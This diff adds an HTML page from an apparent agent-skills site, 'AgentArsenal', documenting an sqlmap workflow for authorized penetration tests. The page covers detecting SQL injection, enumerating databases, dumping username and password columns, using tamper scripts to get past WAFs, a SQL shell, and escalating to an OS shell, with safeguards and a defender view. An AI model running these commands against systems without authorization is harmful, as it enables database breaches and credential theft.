@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: sqlmap-automation</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>sqlmap-automation</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a SQL injection point is confirmed and you want sqlmap</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">requires:</span> <a href="web-sqli.html">web-sqli</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="api-security-testing.html">api-security-testing</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>sqlmap</td><td>1.9.2</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>sqlmap automates the full SQL injection workflow: heuristic detection, technique selection, fingerprinting, enumeration, and dumping. This skill covers operating sqlmap 1.9.2 on authorized engagements with the right discipline: start narrow, widen only with permission, throttle on fragile targets, and dump the minimum data that proves impact. It assumes the point is already a candidate; blindly pointing sqlmap at a whole site is what sqli-detection exists to avoid.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Capture the exact request in Burp and save it as a request file.</li>
+<li>Run detection only (<code>--batch</code>) against the marked parameter.</li>
+<li>Review what sqlmap found: injection class, DBMS, technique.</li>
+<li>Enumerate narrowly: current user, current database, list of databases.</li>
+<li>Enumerate the target schema: tables, then columns, then a limited dump.</li>
+<li>Use tamper scripts and delays when filters or fragile infrastructure</li>
+<p>demand it.</p>
+<li>Save the session log and the exact commands for the report.</li>
+</ol>
+<h2>1. Detection runs</h2>
+<p>Always start from a request file so sqlmap replays the exact request, including cookies and headers.</p>
+<pre><code class="language-bash"># Basic detection on a saved request, non-interactive
+sqlmap -r /tmp/login.req --batch
+
+# Mark the exact parameter when several exist
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch
+
+# POST form with session cookie
+sqlmap -u &quot;https://target.example/search&quot; --data=&quot;q=test*&quot; \
+  --cookie=&quot;session=abc123&quot; --batch
+
+# JSON body: mark the injectable field with *
+sqlmap -u &quot;https://target.example/api/search&quot; \
+  --data=&#x27;{&quot;q&quot;:&quot;test*&quot;,&quot;page&quot;:1}&#x27; --batch
+
+# Route through Burp to inspect what sqlmap actually sends
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  --proxy=http://127.0.0.1:8080</code></pre>
+<p>Read the detection output before enumerating. If sqlmap says the parameter is not injectable but your manual probes disagreed, save the manual request as a file and rerun with <code>-r</code> before trusting the negative.</p>
+<h2>2. Controlled enumeration</h2>
+<p>Widen one step at a time. Each flag below is a separate, reviewable step.</p>
+<pre><code class="language-bash"># Fingerprint: user, database, version, list of databases
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  --current-user --current-db --banner --dbs
+
+# Tables in the target database
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  -D targetdb --tables
+
+# Columns of the interesting table
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  -D targetdb -T users --columns
+
+# Dump specific columns, limited rows
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  -D targetdb -T users -C username,password --dump --start=1 --stop=5
+
+# Interactive SQL shell on the confirmed injection
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch --sql-shell</code></pre>
+<p>Dump discipline: name the columns, cap the rows, never <code>--dump-all</code> on a production database. The report needs proof of access, not the customer table.</p>
+<h2>3. Filters, throttling, and second-order</h2>
+<pre><code class="language-bash"># Tamper scripts for basic keyword and space filters
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  --tamper=space2comment --random-agent
+
+# Chain tampers when one is not enough
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  --tamper=space2comment,between,randomcase
+
+# Fragile target: one thread, delay between requests, generous timeout
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch \
+  --threads=1 --delay=1 --timeout=30 --retries=2
+
+# Limit to UNION technique when you know output is visible
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch --technique=U
+
+# Raise level and risk only with explicit permission
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch --level=5 --risk=3
+
+# Second-order: inject at registration, check the profile page
+sqlmap -u &quot;https://target.example/register&quot; --data=&quot;user=test*&amp;pass=x&quot; \
+  --second-url=&quot;https://target.example/profile&quot; --batch
+
+# Fresh session per target so cached results never leak across tests
+sqlmap -u &quot;https://target.example/item?id=1&quot; --batch --flush-session</code></pre>
+<p><code>--batch</code> is mandatory for unattended runs: sqlmap must never stop to ask a question mid-engagement. <code>--flush-session</code> between targets keeps results honest.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>sqlmap detects nothing but manual probes worked. The request file differs</li>
+<p>from your manual request (encoding, header order, cookie). Diff them and rerun with <code>-r</code> until they match.</p>
+<li>The target rate-limits sqlmap. Drop to <code>--threads=1 --delay=2</code>, or run</li>
+<p>detection only and do the slow parts manually.</p>
+<li>CSRF tokens expire between runs. Use <code>--csrf-token</code> handling or refresh</li>
+<p>the request file before each run.</p>
+<li>Login sessions expire mid-enumeration. Re-authenticate, update the cookie</li>
+<p>in the request file, and rerun with <code>--flush-session</code>.</p>
+<li>The database is huge and enumeration crawls. Target one database with</li>
+<p><code>-D</code>, exclude system schemas, and set <code>--exclude-sysdbs</code>.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li><code>--os-shell</code> or file read/write is requested: only with explicit written</li>
+<p>permission in the rules of engagement, and stop at a harmless proof such as reading one non-sensitive file.</p>
+<li>Tamper scripts fail against a strong WAF: document the block, try</li>
+<p><code>--technique=B</code> (boolean blind needs fewer keywords), or hand the point to sqli-manual-fallback for a crafted manual bypass.</p>
+<li>sqlmap crashes on an unusual DBMS: pin the DBMS with <code>--dbms=mysql</code> (or</li>
+<p>the fingerprinted engine) to skip the fingerprinting heuristics.</p>
+<li>You need evidence of exactly what was sent: the <code>--proxy</code> run through</li>
+<p>Burp plus <code>--output-dir</code> gives you the full request log for the report.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see sqlmap as bursts of requests with its default User-Agent (or a rotated one with <code>--random-agent</code>), heavy use of SQL keywords and tamper patterns, and long sessions enumerating <code>information_schema</code>. It is one of the easiest tools to signature, which is why manual fallback exists. Defense is the standard set: parameterized queries, WAF rules for automation patterns, rate limiting per session, and alerting on enumeration-like request sequences.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>sqlmap 1.9.2 usage guide: https://sqlmap.org/usage/</li>
+<li>OWASP Testing Guide: Testing for SQL Injection (OTG-INPVAL-005).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
